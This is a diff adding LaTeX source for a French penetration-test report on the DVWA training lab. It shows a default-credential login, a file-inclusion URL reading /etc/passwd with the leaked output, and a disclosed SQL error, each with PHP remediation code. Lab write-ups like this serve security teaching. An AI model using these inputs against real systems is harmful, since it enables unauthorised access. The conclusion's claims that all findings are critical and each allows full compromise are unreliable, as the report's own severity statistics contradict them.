+		$session_id = bin2hex(random_bytes(32)); // 64 caractères hex
+		session_id($session_id);
+		session_start();
+		
+		// En PHP 7.1+, utiliser directement:
+		session_start([
+		'name' => 'SECURE_PHPSESSID',
+		'cookie_lifetime' => 3600,
+		'cookie_httponly' => true,
+		'cookie_secure' => true,  // HTTPS uniquement
+		'cookie_samesite' => 'Strict'
+		]);
+	\end{lstlisting}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% A02: DEFAULT CREDENTIALS
+	% ──────────────────────────────────────────────────────────────────────
+	
+	\section{A02: Security Misconfiguration - Default Credentials}
+	
+	\subsection{Description}
+	
+	L'application DVWA est livrée avec des identifiants par défaut bien connus, 
+	jamais changés après installation.
+	
+	\subsection{Exploitation}
+	
+	\begin{enumerate}
+		\item Accéder à \texttt{http://192.168.10.100:8080/}
+		\item Entrer :
+		\begin{itemize}
+			\item Username: \texttt{admin}
+			\item Password: \texttt{password}
+		\end{itemize}
+		\item Cliquer \textbf{Login}
+	\end{enumerate}
+	
+	\subsection{Résultats}
+	
+	\textbf{Accès immédiat à l'application avec privilèges administrateur.}
+	
+	Ces identifiants sont publiquement documentés sur tous les guides DVWA. 
+	Il n'y a aucun MFA, aucune vérification additionnelle.
+	
+	\subsection{Impact}
+	
+	\begin{tcolorbox}[colback=criticalred!10!white, colframe=criticalred, 
+		title=\textbf{CRITICITÉ: CRITIQUE}]
+		Accès complet à l'application en quelques secondes, sans aucun contournement technique requis.
+	\end{tcolorbox}
+	
+	\subsection{Screenshot}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{weak-creds.png}
+		\caption{Connexion avec Identifiants par Défaut}
+		\label{fig:weak-creds}
+	\end{figure}
+	
+	\subsection{Remédiation}
+	
+	\begin{enumerate}
+		\item \textbf{Changer les identifiants par défaut} lors de l'installation
+		\item \textbf{Appliquer une politique de mots de passe forts :}
+		\begin{itemize}
+			\item Minimum 12 caractères
+			\item Mélange de majuscules, minuscules, chiffres et symboles
+		\end{itemize}
+		\item \textbf{Implémenter MFA (Multi-Factor Authentication)}
+		\item \textbf{Logs de connexion} pour auditer les accès
+	\end{enumerate}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% A01: FILE INCLUSION
+	% ──────────────────────────────────────────────────────────────────────
+	
+	\section{A01: Broken Access Control - Local File Inclusion}
+	
+	\subsection{Description}
+	
+	Path Traversal (traversée de répertoires) permet d'accéder à des fichiers 
+	en dehors du répertoire web autorisé, notamment les fichiers système.
+	
+	\subsection{Exploitation}
+	
+	\begin{enumerate}
+		\item Accéder à : \textbf{Vulnerabilities → File Inclusion}
+		\item Modifier l'URL pour traverser les répertoires:
+		\begin{lstlisting}[numbers=none,frame=none,backgroundcolor={},caption=URL modifiée]
+			http://192.168.10.100:8080/vulnerabilities/fi/?page=/etc/passwd
+		\end{lstlisting}
+	\end{enumerate}
+	
+	\subsection{Résultats}
+	
+	\textbf{Le fichier /etc/passwd est affiché directement :}
+	
+	\begin{lstlisting}[style=logstyle,caption=Contenu de /etc/passwd divulgué]
+		root:x:0:0:root:/root:/bin/bash
+		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+		bin:x:2:2:bin:/bin:/usr/sbin/nologin
+		sys:x:3:3:sys:/dev:/usr/sbin/nologin
+		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+		mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+	\end{lstlisting}
+	
+	\subsection{Impact}
+	
+	\begin{tcolorbox}[colback=warningorange!10!white, colframe=warningorange, 
+		title=\textbf{CRITICITÉ: HAUTE}]
+		\begin{itemize}
+			\item Divulgation de la structure système
+			\item Énumération de comptes utilisateurs
+			\item Base pour attaques de post-exploitation
+		\end{itemize}
+	\end{tcolorbox}
+	
+	\subsection{Screenshot}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{file-inclusion-lfi.png}
+		\caption{Local File Inclusion - Fichier /etc/passwd Exposé}
+		\label{fig:file-inclusion}
+	\end{figure}
+	
+	\subsection{Remédiation}
+	
+	\begin{lstlisting}[language=php,caption=Protection contre Path Traversal]
+		// VULNÉRABLE
+		include($_GET['page'] . '.php');
+		
+		// SÉCURISÉ - Whitelist
+		$allowed_pages = array('home', 'about', 'contact', 'products');
+		$page = basename($_GET['page']); // Supprime ../
+		
+		if (in_array($page, $allowed_pages)) {
+			include(__DIR__ . '/pages/' . $page . '.php');
+		} else {
+			include(__DIR__ . '/pages/error.php');
+		}
+		
+		// ALTERNATIVE - Utiliser un système de templates
+		// $smarty = new Smarty();
+		// $smarty->display('templates/' . $page . '.tpl');
+	\end{lstlisting}
+	
+	% ──────────────────────────────────────────────────────────────────────
+	% A10: ERROR DISCLOSURE
+	% ──────────────────────────────────────────────────────────────────────
+	
+	\section{A10: Mishandling of Exceptional Conditions - Error Disclosure}
+	
+	\subsection{Description}
+	
+	Les messages d'erreur détaillés exposent des informations sensibles 
+	sur la structure et les technologies utilisées.
+	
+	\subsection{Exploitation}
+	
+	La tentative SQL Injection précédente (Section 4.3) a déjà révélé 
+	le message d'erreur MariaDB :
+	
+	\begin{lstlisting}[caption=Message d'Erreur Divulgué]
+		You have an error in your SQL syntax; check the manual that corresponds 
+		to your MariaDB server version for the right syntax to use near ''' at line 1
+	\end{lstlisting}
+	
+	\subsection{Informations Divulguées}
+	
+	\begin{itemize}
+		\item \textbf{Database Type :} MariaDB (spécifique, pas MySQL générique)
+		\item \textbf{SQL Structure :} Révèle le format de la requête vulnérable
+		\item \textbf{Syntaxe Details :} Aide à affiner les payloads d'exploitation
+	\end{itemize}
+	
+	\subsection{Impact}
+	
+	\begin{tcolorbox}[colback=warningorange!10!white, colframe=warningorange, 
+		title=\textbf{CRITICITÉ: MOYENNE}]
+		Fournit des indices importants pour des attaques plus ciblées.
+	\end{tcolorbox}
+	
+	\subsection{Screenshot}
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.95\textwidth]{sql-injection-error.png}
+		\caption{Message d'Erreur SQL Détaillé}
+		\label{fig:error-disclosure}
+	\end{figure}
+	
+	\subsection{Remédiation}
+	
+	\begin{lstlisting}[language=php,caption=Gestion Sécurisée des Erreurs]
+		// VULNÉRABLE - Messages détaillés à l'utilisateur
+		try {
+			$result = $mysqli->query($sql);
+		} catch (Exception $e) {
+			echo "Erreur: " . $e->getMessage(); // JAMAIS FAIRE CECI!
+		}
+		
+		// SÉCURISÉ - Logs serveur, message générique à l'utilisateur
+		try {
+			$result = $mysqli->query($sql);
+		} catch (Exception $e) {
+			// Log le détail (fichier, pas visible à l'utilisateur)
+			error_log("SQL Error: " . $e->getMessage());
+			
+			// Message générique à l'utilisateur
+			die("Une erreur s'est produite. Veuillez contacter l'administrateur.");
+		}
+		
+		// Configuration dans php.ini (en production)
+		// display_errors = Off
+		// log_errors = On
+		// error_log = /var/log/php-errors.log
+	\end{lstlisting}
+	
+	% ══════════════════════════════════════════════════════════════════════
+	% CHAPITRE 5 : RÉSUMÉ DES VULNÉRABILITÉS
+	% ══════════════════════════════════════════════════════════════════════
+	
+	\chapter{Résumé Consolidé des Vulnérabilités}
+	
+	\section{Tableau de Synthèse OWASP Top 10: 2025}
+	
+	\begin{longtable}{p{2.2cm} p{4.2cm} >{\centering\arraybackslash}p{2.2cm} p{4.2cm}}
+		\hline
+		% Dans le tableau synthèse (ligne ~1130), remplace les ✓ et ✗:
+		\rowcolor{tablerowalt}
+		\textbf{A01} & Broken Access Control & HAUTE & LFI [OK] \\
+		
+		\textbf{A02} & Security Misconfiguration & CRITIQUE & Default Creds [OK] \\
+		
+		\rowcolor{tablerowalt}
+		\textbf{A03} & Software Supply Chain & MOYENNE & Non testée [X] \\
+		
+		\textbf{A04} & Cryptographic Failures & CRITIQUE & Weak Sessions [OK] \\
+		
+		\rowcolor{tablerowalt}
+		\textbf{A05} & Injection & CRITIQUE & SQL + Command [OK] \\
+		
+		\textbf{A06} & Insecure Design & MOYENNE & Non testée [X] \\
+		
+		\rowcolor{tablerowalt}
+		\textbf{A07} & Authentication Failures & HAUTE & Brute Force [OK] \\
+		
+		\textbf{A08} & File Upload/Integrity & CRITIQUE & Web Shell [OK] \\
+		
+		\rowcolor{tablerowalt}
+		\textbf{A09} & Logging/Alerting Failures & MOYENNE & Non testée [X] \\
+		
+		\textbf{A10} & Exceptional Conditions & MOYENNE & Error Disclosure [OK] \\
+		
+		\caption{Synthèse OWASP Top 10: 2025 - Résultats d'Évaluation}
+		\label{tab:owasp-summary}
+	\end{longtable}
+	
+	\section{Statistiques des Attaques}
+	
+	\begin{itemize}
+		\item \textbf{Vulnérabilités Testées :} 7/10 (70\%)
+		\item \textbf{Attaques Réussies :} 8/8 (100\%)
+		\item \textbf{Sévérité CRITIQUE :} 4 vulnérabilités
+		\item \textbf{Sévérité HAUTE :} 3 vulnérabilités
+		\item \textbf{Sévérité MOYENNE :} 1 vulnérabilité
+	\end{itemize}
+
+	
+	% ══════════════════════════════════════════════════════════════════════
+	% CHAPITRE 7 : CONCLUSION
+	% ══════════════════════════════════════════════════════════════════════
+	
+	\chapter{Conclusion}
+	
+	Cette évaluation a permis de démontrer la présence de \textbf{8 vulnérabilités critiques} 
+	dans l'application DVWA, couvrant 7 catégories de la liste OWASP Top 10: 2025.
+	
+	\section{Résultats Clés}
+	
+	\begin{itemize}
+		\item \textbf{100\% d'Exploitabilité :} Toutes les vulnérabilités testées ont été exploitées avec succès
+		\item \textbf{Risque Critique :} 4 vulnérabilités OWASP A05 (Injection), A08 (Upload), A04 (Crypto), A02 (Config)
+		\item \textbf{Impact Systémique :} Chaque vulnérabilité permet une compromission complète du système
+	\end{itemize}
+	
+	\section{Leçons Apprises}
+	
+	\begin{itemize}
+		\item La \textbf{validation des entrées} est le fondement de la sécurité applicative
+		\item La \textbf{segmentation réseau} limite le blast radius mais ne suffit pas seule
+		\item La \textbf{défense en profondeur} (WAF + Code Secure + Monitoring) est essentielle
+		\item Les \textbf{erreurs de configuration} (credentials par défaut) sont souvent les plus critiques
+	\end{itemize}
+	
+	\section{Recommandation Finale}
+	
+	DVWA doit être considérée comme \textbf{NON SÉCURISÉE} pour tout environnement de production. 
+	Les vulnérabilités identifiées permettent une compromission complète du système en quelques minutes 
+	par un attaquant ayant une connaissance basique de sécurité web.
+	
+\end{document}
